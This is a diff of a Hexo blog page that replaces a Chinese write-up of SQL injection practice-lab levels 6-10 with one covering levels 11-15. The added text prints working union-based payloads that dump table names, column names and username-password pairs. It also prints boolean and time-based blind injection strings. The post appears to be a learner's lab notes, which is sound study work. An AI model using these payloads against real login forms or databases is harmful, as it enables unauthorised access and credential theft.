@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>sql 6-10关 | Hexo</title>
+  <title>sql 11-15关 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="sql第六关 1.输入id&#x3D;1”报错，初步判断是双引号型字符注入，验证后发现确实 2.发现可以使用报错注入等，与上一关无区别 sql第七关 1.输入id&#x3D;1’报错，输入id&#x3D;1”#，正常回显，但是表明双引号被过滤，说明不是双引号过滤，由于单引号报错，就继续试，发现id&#x3D;-1”))#成功了 2.跟前几关无异 sql第八关 1.输入id&#x3D;1’，页面变化">
+  <meta name="description" content="sql第十一关 1.这关点开发现是以浏览器表单的形式进行注入，上面的输入框是username，下面的是password，用户名随便输个数，密码再慢慢试验，id&#x3D;1’时发现报错，进一步验证为单引号注入，用order by测试为两列 2.输入Password：1’ union select 1,2，发现正常回显在页面下方 3.输入1’ union select 1,group_concat(">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql 6-10关">
-<meta property="og:url" content="http://example.com/2022/12/12/sql-6-10%E5%85%B3/index.html">
+<meta property="og:title" content="sql 11-15关">
+<meta property="og:url" content="http://example.com/2023/12/15/sql-11-15%E5%85%B3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="sql第六关 1.输入id&#x3D;1”报错，初步判断是双引号型字符注入，验证后发现确实 2.发现可以使用报错注入等，与上一关无区别 sql第七关 1.输入id&#x3D;1’报错，输入id&#x3D;1”#，正常回显，但是表明双引号被过滤，说明不是双引号过滤，由于单引号报错，就继续试，发现id&#x3D;-1”))#成功了 2.跟前几关无异 sql第八关 1.输入id&#x3D;1’，页面变化">
+<meta property="og:description" content="sql第十一关 1.这关点开发现是以浏览器表单的形式进行注入，上面的输入框是username，下面的是password，用户名随便输个数，密码再慢慢试验，id&#x3D;1’时发现报错，进一步验证为单引号注入，用order by测试为两列 2.输入Password：1’ union select 1,2，发现正常回显在页面下方 3.输入1’ union select 1,group_concat(">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-12-11T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-04-08T16:25:40.109Z">
+<meta property="article:published_time" content="2023-12-15T07:51:17.000Z">
+<meta property="article:modified_time" content="2023-04-09T08:43:05.314Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -73,10 +73,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-sql-6-10关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-sql-11-15关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/12/12/sql-6-10%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2022-12-11T16:00:00.000Z" itemprop="datePublished">2022-12-12</time>
+    <a href="/2023/12/15/sql-11-15%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T07:51:17.000Z" itemprop="datePublished">2023-12-15</time>
 </a>
     
   </div>
@@ -87,7 +87,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      sql 6-10关
+      sql 11-15关
     </h1>
   
 
@@ -95,30 +95,36 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>sql第六关</p>
-<p>1.输入id&#x3D;1”报错，初步判断是双引号型字符注入，验证后发现确实</p>
-<p>2.发现可以使用报错注入等，与上一关无区别</p>
-<p>sql第七关</p>
-<p>1.输入id&#x3D;1’报错，输入id&#x3D;1”#，正常回显，但是表明双引号被过滤，说明不是双引号过滤，由于单引号报错，就继续试，发现id&#x3D;-1”))#成功了</p>
-<p>2.跟前几关无异</p>
-<p>sql第八关</p>
-<p>1.输入id&#x3D;1’，页面变化但没报错，输入其它的发现页面均正常回应，因此从单引号开始入手，输入id&#x3D;1’#发现就是单引号注入，但是发现注入后根本不回显任何信息。</p>
-<p>2.采用bool盲注，输入id&#x3D;1’ and length(database()) &#x3D;1 –+，一直没反应，知道输入到8为止，正常回显，所以数据库长度是8</p>
-<p>3.猜库名，输入id&#x3D;1’ and ascill(substr(database(),1,1))&gt;97 –+，渐渐爆出来了，然后拼就行。</p>
-<p>4.然后猜表名列名，总有把范围缩小完的时候。</p>
-<p>sql第九关</p>
-<p>1.不断判断注入方式，但页面没有任何变化，因此需要寻找参照点</p>
-<p>2.选择时间盲注，输入id&#x3D;x and if(x,sleep(a),1)，不断尝试注入方式，查看页面的反应时间，在id&#x3D;1”的时候反应时间变慢，所以是双引号注入。</p>
-<p>3.if()函数中：<br>    x为布尔盲注中的长度、字符猜测语句，如：length(database())&#x3D;1<br>    sleep()函数，a为时间间隔，如果前面的语句x为真，则在页面出来前间隔a秒；<br>    1：占位</p>
-<p>4.使用对应语句，然后把表名列名弄出来。</p>
-<p>sql第十关</p>
-<p>1.还是没反应，跟第九关一样，最后试出来是双引号闭合</p>
-<p>2.操作如第九关</p>
+        <p>sql第十一关</p>
+<p>1.这关点开发现是以浏览器表单的形式进行注入，上面的输入框是username，下面的是password，用户名随便输个数，密码再慢慢试验，id&#x3D;1’时发现报错，进一步验证为单引号注入，用order by测试为两列</p>
+<p>2.输入Password：1’ union select 1,2，发现正常回显在页面下方</p>
+<p>3.输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘security’#</p>
+<p>4.输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;‘users’ and table_schema&#x3D;‘security’#</p>
+<p>5.输入1’ union select 1,group_concat(username,’~’,password) from security.users#</p>
+<p>6.得到结果</p>
+<p>sql第十二关</p>
+<p>1.测试闭合方式为”)</p>
+<p>2.其它同十一关</p>
+<p>sql第十三关</p>
+<p>1.注入方式为’)，但不存在显示位，使用报错注入即可，这边用的是xpath的报错注入</p>
+<p>sql第十四关</p>
+<p>1.双引号闭合</p>
+<p>2.报错注入即可</p>
+<p>sql第十五关</p>
+<p>1.这个页面既没有正常回显，也没有报错信息回显，于是考虑使用bool盲注</p>
+<p>2.1’ or length(database())&gt;8 #，就用这种方法来判断长度（这边要注意一下用的是or而不是and，用or只要一个对就能执行了，用and要两个都对才行，而你又猜不到id和密码），发现&gt;7时错误，说明长度是8</p>
+<p>3.1’ or left(database(),1)&gt;’z’ #，一个个试，算出来了数据库名字</p>
+<p>4.1’ or length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;6 #这是猜第一张表的长度的，结果就是6</p>
+<p>5.1’ or left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1)&gt;’f’ #测试表名</p>
+<p>6.1’ or length((select column_name from information_schema.columns where table_name&#x3D;’emails’ limit 0,1))&gt;3 #测试表的第一列长度，结果报错，试验1也报错，得出2</p>
+<p>7.1’ or left((select column_name from information_schema.columns where table_name&#x3D;’emails’ limit 0,1),1)&gt;’a’ #<br>猜列名</p>
+<p>8.1’ or left((select id from emails limit 0,1),1)&gt;0 #猜字段</p>
+<p>9.一个个弄出来即可</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/12/sql-6-10%E5%85%B3/" data-id="clg86utyz0000lwxx9h5g46yc" data-title="sql 6-10关" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/12/15/sql-11-15%E5%85%B3/" data-id="clg95qsqt0000b8xx4dt501kg" data-title="sql 11-15关" class="article-share-link">Share</a>
       
       
       
@@ -128,19 +134,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2022/12/23/test/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          test
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/12/10/sql1-5%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2022/12/23/test/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sql1-5关</div>
+      <div class="article-nav-title">test</div>
     </a>
   
 </nav>
